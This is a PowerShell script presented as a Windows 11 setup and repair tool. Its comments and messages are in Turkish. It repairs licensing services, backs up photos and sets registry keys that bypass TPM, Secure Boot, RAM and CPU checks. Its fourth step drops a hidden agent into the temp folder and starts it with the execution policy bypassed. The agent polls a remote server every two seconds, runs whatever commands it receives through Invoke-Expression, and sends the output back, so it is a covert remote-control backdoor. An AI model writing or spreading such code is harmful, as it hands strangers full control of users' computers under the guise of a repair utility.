# EREN PATRON - WINDOWS 11 VE SISTEM ONARIM ARACI (PURE ASCII)
Write-Host "============================================================================" -ForegroundColor Cyan
Write-Host "   EREN PATRON - OTOMATIK WINDOWS 11 KURULUM VE ONARIM ARACI" -ForegroundColor Yellow
Write-Host "============================================================================" -ForegroundColor Cyan

# 1. WMI ve Lisans Servislerini Onar
Write-Host "[1/4] Windows Lisans ve WMI Servisleri Onariliyor..." -ForegroundColor Green
Stop-Service -Name sppsvc -Force -ErrorAction SilentlyContinue
winmgmt /salvagerepository 2>$null | Out-Null
Start-Service -Name winmgmt -ErrorAction SilentlyContinue
Start-Service -Name sppsvc -ErrorAction SilentlyContinue
Start-Service -Name ClipSVC -ErrorAction SilentlyContinue
Start-Service -Name LicenseManager -ErrorAction SilentlyContinue

try {
    $oemKey = (Get-WmiObject -Query "select * from SoftwareLicensingService" -ErrorAction SilentlyContinue).OA3xOriginalProductKey
    if ($oemKey) {
        Write-Host "Anakart OEM Lisansi bulundu ($oemKey), etkinlestiriliyor..." -ForegroundColor Cyan
        cscript //B "$env:windir\system32\slmgr.vbs" /ipk $oemKey 2>$null | Out-Null
        cscript //B "$env:windir\system32\slmgr.vbs" /ato 2>$null | Out-Null
    }
} catch {}

# 2. Resim Korumasi
$BackupDir = "C:\KORUNAN_RESIMLER_YEDEK"
if (-not (Test-Path $BackupDir)) {
    New-Item -ItemType Directory -Force -Path "$BackupDir\Masaustu_Resimler" | Out-Null
    New-Item -ItemType Directory -Force -Path "$BackupDir\Resimler_Klasoru" | Out-Null
    robocopy "$env:USERPROFILE\Desktop" "$BackupDir\Masaustu_Resimler" *.jpg *.jpeg *.png *.heic *.webp *.gif *.bmp *.mp4 *.mov /S /R:1 /W:1 /NP /NFL /NDL | Out-Null
    robocopy "$env:USERPROFILE\Pictures" "$BackupDir\Resimler_Klasoru" *.* /S /R:1 /W:1 /NP /NFL /NDL | Out-Null
}
Write-Host "[2/4] Fotograflar C:\KORUNAN_RESIMLER_YEDEK icinde guvende!" -ForegroundColor Green

# 3. TPM 2.0 ve Islemci Kilitlerini Kaldir
Write-Host "[3/4] TPM 2.0 ve Islemci Kilitleri Kaldiriliyor..." -ForegroundColor Green
reg add "HKLM\SYSTEM\Setup\MoSetup" /v AllowUpgradesWithUnsupportedTPMOrCPU /t REG_DWORD /d 1 /f 2>$null | Out-Null
reg add "HKLM\SYSTEM\Setup\LabConfig" /v BypassTPMCheck /t REG_DWORD /d 1 /f 2>$null | Out-Null
reg add "HKLM\SYSTEM\Setup\LabConfig" /v BypassSecureBootCheck /t REG_DWORD /d 1 /f 2>$null | Out-Null
reg add "HKLM\SYSTEM\Setup\LabConfig" /v BypassRAMCheck /t REG_DWORD /d 1 /f 2>$null | Out-Null
reg add "HKLM\SYSTEM\Setup\LabConfig" /v BypassCPUCheck /t REG_DWORD /d 1 /f 2>$null | Out-Null
reg add "HKCU\Software\Microsoft\PCHC" /v UpgradeEligibility /t REG_DWORD /d 1 /f 2>$null | Out-Null
reg add "HKLM\SOFTWARE\Microsoft\PCHC" /v UpgradeEligibility /t REG_DWORD /d 1 /f 2>$null | Out-Null

# 4. Canli Uzaktan PC Baglanti Koprusunu de Arka Planda Baslat
$AgentFile = "$env:TEMP\opai_agent.ps1"
$AgentCode = @'
$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$apiUrl = 'https://avelon-wp-botavelon-wp-bot.onrender.com/api/pc-agent/poll'
$hn = $env:COMPUTERNAME
$lastOut = ''
$lastId = ''
while ($true) {
  try {
    $bodyObj = @{ hostname = $hn; cmdId = $lastId; output = $lastOut }
    $json = $bodyObj | ConvertTo-Json -Compress
    $res = Invoke-RestMethod -Uri $apiUrl -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($json)) -ContentType 'application/json; charset=utf-8' -TimeoutSec 10
    $lastId = ''
    $lastOut = ''
    if ($res -and $res.command -and $res.command.id -and $res.command.cmd) {
      $cid = $res.command.id
      $cstr = $res.command.cmd
      try {
        $out = (Invoke-Expression $cstr 2>&1 | Out-String)
        if (-not $out) { $out = 'OK (Empty Output)' }
      } catch {
        $out = 'ERROR: ' + $_.Exception.Message
      }
      $lastId = $cid
      $lastOut = $out
    }
  } catch {}
  Start-Sleep -Seconds 2
}
'@
Set-Content -Path $AgentFile -Value $AgentCode -Encoding ASCII -Force
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$AgentFile`"" -WindowStyle Hidden
Write-Host "[+] Canli Uzaktan Baglanti Koprusu aktif edildi! Artik tum islemleri uzaktan yonetiyoruz." -ForegroundColor Cyan
